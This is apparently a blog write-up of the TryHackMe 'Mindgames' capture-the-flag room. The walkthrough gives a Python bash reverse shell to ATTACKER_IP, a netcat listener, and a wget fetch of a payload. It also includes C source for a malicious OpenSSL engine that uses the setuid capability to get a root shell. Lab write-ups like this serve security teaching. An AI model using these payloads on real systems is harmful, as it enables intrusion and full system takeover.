---
layout: post
title:  "Mindgames Writeup"
date:   2024-05-23 13:15:45 -0400
categories: tryhackme medium
tags: writeup tryhackme medium CTF
---
## Introduction
This is a medium challenge box on
[TryHackMe](https://tryhackme.com/r/room/mindgames){:target="_blank"}{:rel="noopener noreferrer"}

## Enumeration
### Ports
As always, begin with a port scan to see accessible services

```bash
rustscan -a VICTIM_IP -- -A -oA scan -sC
```

![scan1](/images/mindgames/mindgames-scan1.png)

![scan2](/images/mindgames/mindgames-scan2.png)

There are two services running
- 22: SSH
- 80: HTTP

### Web
> What cipher is being used as the input?

Let's visit the web server and start investigating

![homepage](/images/mindgames/mindgames-homepage.png)

So we're given some weird text and a place to run it. 
If you're familiar with ciphers you might already 
recognize what this weird text is, but if not don't 
worry! You can always use 
[this website](https://www.dcode.fr/cipher-identifier){:target="_blank"}{:rel="noopener noreferrer"}
to figure out what cipher is being used.

![identify-cipher](/images/mindgames/mindgames-identify-cipher.png)

So the cipher is called Brainfuck! Let's decode this to see what exactly is being run

![hello-world](/images/mindgames/mindgames-hello-world.png)

This looks like python. To be sure, let's decode the fibonacci example as well.

![fibonacci](/images/mindgames/mindgames-fibonacci.png)

This is definitely python. It looks like this program takes user input, decodes it, and then runs it through python. This sounds exactly like remote code execution

## Initial Foothold
> How can we use python to create a reverse shell?

Here is a very handy 
[reverse shell generator](https://www.revshells.com/){:target="_blank"}{:rel="noopener noreferrer"}

```python
import os
os.system("/bin/bash -c '/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'")
```

This essentially executes a bash reverse shell using python. I've found a lot of success with this particular bash payload to the point where I have a macro assigned to it! We can use the same website to encode our python and get our brainfuck ciphertext
I use quite often. If one command doesn't work for you, remember to be persistent and try the other options! This is what I used

![bf-payload](/images/mindgames/mindgames-bf-payload.png)

Let's set up a listener to accept the reverse shell and run it

```bash
nc -lvnp 4444
```

![revshell](/images/mindgames/mindgames-revshell.png)

Success! Since python3 is available we can stabilize our shell with the following

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# ctrl+z
stty raw -echo && fg
export SHELL=/bin/bash
export TERM=screen
```

We're already the mindgames user so we can immediately read 
`user.txt`

![user-flag](/images/mindgames/mindgames-user-flag.png)

## Root
> Are there any files with interesting permissions or capabilities?

We can get the capabilities of files using this command

```bash
getcap -r / 2>/dev/null
```

![capabilities](/images/mindgames/mindgames-capabilities.png)

`/usr/bin/openssl` has the setuid capability set. 
According to the 
[man pages](https://www.man7.org/linux/man-pages/man2/setuid.2.html){:target="_blank"}{:rel="noopener noreferrer"},
`setuid` is able to set the effective user id of the 
created process. So if we can create a shell, we can 
effectively get root permissions!

Doing a a bit of searching I found 
[this writeup](https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/){:target="_blank"}{:rel="noopener noreferrer"}
which gives us instructions to escalate privileges with 
`openssl`

### Exploit Generation
On our machine we'll compile the shared object file the exploit will use. In order to use the openssl engine header in C we'll need to install the proper libraries. On Debian based systems we can run

```bash
sudo apt-get install libssl-dev
```

Then copy this C code to a file named
`openssl-exploit-engine.c`

```c
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id)
{
  setuid(0); setgid(0);
  system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```

Next we'll compile and create a library file with the following

```bash
gcc -fPIC -o openssl-exploit-engine.o -c openssl-exploit-engine.c
gcc -shared -o openssl-exploit-engine.so -lcrypto openssl-exploit-engine.o
```

### Exploit Upload
We need to upload this to the machine. This can be done any number of ways but today we'll use python

```bash
# in the directory with opensssl-exploit-engine.so
python3 -m http.server 80

# on the victim machine
wget http://ATTACKER_IP/openssl-exploit-engine.so
```

### Shell
Now that everything is set up we can get a root shell with the following

```bash
openssl req -engine ./openssl-exploit-engine.so
```

![root-flag](/images/mindgames/mindgames-root-flag.png)

## Recap
Web homepage has a service which decodes brainfuck inputted by the user and executes python on the server.  A python reverse shell is used to gain a foothold into the system.
`openssl` has the setuid capability enabled which escalates our privileges to root.
